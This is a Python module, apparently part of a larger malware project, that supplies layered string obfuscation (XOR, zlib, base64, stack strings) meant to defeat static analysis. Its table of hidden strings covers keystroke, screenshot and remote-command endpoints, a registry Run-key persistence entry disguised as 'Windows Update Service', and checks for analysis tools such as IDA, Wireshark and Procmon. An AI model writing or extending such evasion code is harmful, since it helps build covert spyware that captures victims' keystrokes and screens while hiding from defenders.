"""
Enhanced String Obfuscation Module
Replace evasion_modules/obfuscation.py with this version
"""
import base64
import zlib
import hashlib
from typing import Union


# ============================================
# BASIC OBFUSCATION
# ============================================

def encode_string(text: str) -> str:
    """Encode string using base64"""
    return base64.b64encode(text.encode()).decode()


def decode_string(encoded: str) -> str:
    """Decode base64 string"""
    return base64.b64decode(encoded.encode()).decode()


# ============================================
# XOR ENCRYPTION
# ============================================

def xor_encrypt(data: Union[str, bytes], key: Union[str, bytes]) -> bytes:
    """Simple XOR encryption"""
    if isinstance(data, str):
        data = data.encode()
    if isinstance(key, str):
        key = key.encode()
    
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key[i % len(key)])
    
    return bytes(result)


def xor_decrypt(data: bytes, key: Union[str, bytes]) -> bytes:
    """Simple XOR decryption (same as encryption)"""
    return xor_encrypt(data, key)


# ============================================
# STACK STRINGS
# ============================================

def build_stack_string(chars: list) -> str:
    """
    Build string at runtime from character codes
    Makes static analysis harder
    
    Example:
        build_stack_string([0x61, 0x70, 0x69])  # "api"
    """
    return ''.join(chr(c) for c in chars)


def string_to_stack_format(text: str) -> list:
    """
    Convert string to stack format (list of character codes)
    
    Usage:
        codes = string_to_stack_format("secret")
        # Later in code: build_stack_string(codes)
    """
    return [ord(c) for c in text]


# ============================================
# COMPRESSED STRINGS
# ============================================

def compress_string(text: str) -> bytes:
    """Compress string using zlib"""
    return zlib.compress(text.encode())


def decompress_string(compressed: bytes) -> str:
    """Decompress zlib compressed string"""
    return zlib.decompress(compressed).decode()


# ============================================
# COMBINED OBFUSCATION
# ============================================

def obfuscate_string(text: str, key: str = "default_key") -> str:
    """
    Multi-layer obfuscation: XOR -> Compress -> Base64
    
    Args:
        text: String to obfuscate
        key: XOR key
    
    Returns:
        Base64-encoded obfuscated string
    """
    # Layer 1: XOR encryption
    encrypted = xor_encrypt(text, key)
    
    # Layer 2: Compression
    compressed = zlib.compress(encrypted)
    
    # Layer 3: Base64 encoding
    encoded = base64.b64encode(compressed).decode()
    
    return encoded


def deobfuscate_string(obfuscated: str, key: str = "default_key") -> str:
    """
    Reverse multi-layer obfuscation: Base64 -> Decompress -> XOR
    
    Args:
        obfuscated: Obfuscated string
        key: XOR key (must match obfuscation key)
    
    Returns:
        Original string
    """
    # Layer 1: Base64 decode
    decoded = base64.b64decode(obfuscated.encode())
    
    # Layer 2: Decompression
    decompressed = zlib.decompress(decoded)
    
    # Layer 3: XOR decryption
    decrypted = xor_decrypt(decompressed, key)
    
    return decrypted.decode()


# ============================================
# HASH-BASED STRING STORAGE
# ============================================

def hash_string(text: str) -> str:
    """Create SHA256 hash of string"""
    return hashlib.sha256(text.encode()).hexdigest()


class ObfuscatedStringStore:
    """
    Store strings by hash, retrieve by hash
    Useful for hiding API names and sensitive strings
    """
    
    def __init__(self, key: str = "default_key"):
        self.key = key
        self.store = {}
    
    def add(self, text: str) -> str:
        """
        Add string to store
        Returns hash that can be used to retrieve it
        """
        text_hash = hash_string(text)
        obfuscated = obfuscate_string(text, self.key)
        self.store[text_hash] = obfuscated
        return text_hash
    
    def get(self, text_hash: str) -> str:
        """Retrieve string by hash"""
        if text_hash in self.store:
            return deobfuscate_string(self.store[text_hash], self.key)
        return None
    
    def get_by_plain(self, text: str) -> str:
        """Retrieve string by providing original text (computes hash)"""
        text_hash = hash_string(text)
        return self.get(text_hash)


# ============================================
# PRE-OBFUSCATED STRINGS
# ============================================

# Generate these at build time or first run
# This is what makes your strings unreadable in the binary

OBFUSCATED_STRINGS = {
    # Config-related
    'config_file': obfuscate_string('config.json'),
    'api_key': obfuscate_string('api_key'),
    'callback_url': obfuscate_string('callback_url'),
    
    # Paths
    'data_dir': obfuscate_string('monitor_data'),
    'screenshots_dir': obfuscate_string('screenshots'),
    'offline_logs': obfuscate_string('offline_logs'),
    
    # API endpoints
    'api_status': obfuscate_string('/api/status'),
    'api_events': obfuscate_string('/api/events'),
    'api_keystrokes': obfuscate_string('/api/keystrokes'),
    'api_screenshot': obfuscate_string('/api/screenshot'),
    'api_command': obfuscate_string('/api/command'),
    
    # Registry keys
    'reg_run_key': obfuscate_string(r'Software\Microsoft\Windows\CurrentVersion\Run'),
    'reg_value_name': obfuscate_string('Windows Update Service'),
    
    # Process names to detect
    'proc_debugger': obfuscate_string('ida.exe'),
    'proc_wireshark': obfuscate_string('wireshark.exe'),
    'proc_procmon': obfuscate_string('procmon.exe'),
}


def get_obfuscated_string(key: str) -> str:
    """
    Retrieve and deobfuscate a pre-obfuscated string
    
    Usage:
        api_endpoint = get_obfuscated_string('api_status')
    """
    if key in OBFUSCATED_STRINGS:
        return deobfuscate_string(OBFUSCATED_STRINGS[key])
    return None


# ============================================
# UTILITY FUNCTIONS
# ============================================

def obfuscate_config_file(config_dict: dict, output_file: str = "config_obfuscated.bin"):
    """
    Save config as obfuscated binary file instead of JSON
    
    Args:
        config_dict: Configuration dictionary
        output_file: Output filename
    """
    import json
    
    # Convert to JSON string
    json_str = json.dumps(config_dict)
    
    # Obfuscate
    obfuscated = obfuscate_string(json_str)
    
    # Save as binary
    with open(output_file, 'wb') as f:
        f.write(obfuscated.encode())


def load_obfuscated_config(input_file: str = "config_obfuscated.bin") -> dict:
    """
    Load obfuscated config file
    
    Args:
        input_file: Obfuscated config filename
    
    Returns:
        Configuration dictionary
    """
    import json
    
    with open(input_file, 'rb') as f:
        obfuscated = f.read().decode()
    
    # Deobfuscate
    json_str = deobfuscate_string(obfuscated)
    
    # Parse JSON
    return json.loads(json_str)


# ============================================
# EXAMPLE USAGE
# ============================================

if __name__ == "__main__":
    # Example 1: Basic obfuscation
    secret = "my_secret_api_key"
    obf = obfuscate_string(secret)
    print(f"Obfuscated: {obf}")
    print(f"Deobfuscated: {deobfuscate_string(obf)}")
    print()
    
    # Example 2: Stack strings
    api_chars = string_to_stack_format("/api/status")
    print(f"Stack format: {api_chars}")
    print(f"Built string: {build_stack_string(api_chars)}")
    print()
    
    # Example 3: String store
    store = ObfuscatedStringStore(key="my_secret_key")
    hash1 = store.add("sensitive_endpoint")
    hash2 = store.add("another_secret")
    print(f"Hash 1: {hash1}")
    print(f"Retrieved: {store.get(hash1)}")
    print()
    
    # Example 4: Pre-obfuscated strings
    endpoint = get_obfuscated_string('api_status')
    print(f"API endpoint: {endpoint}")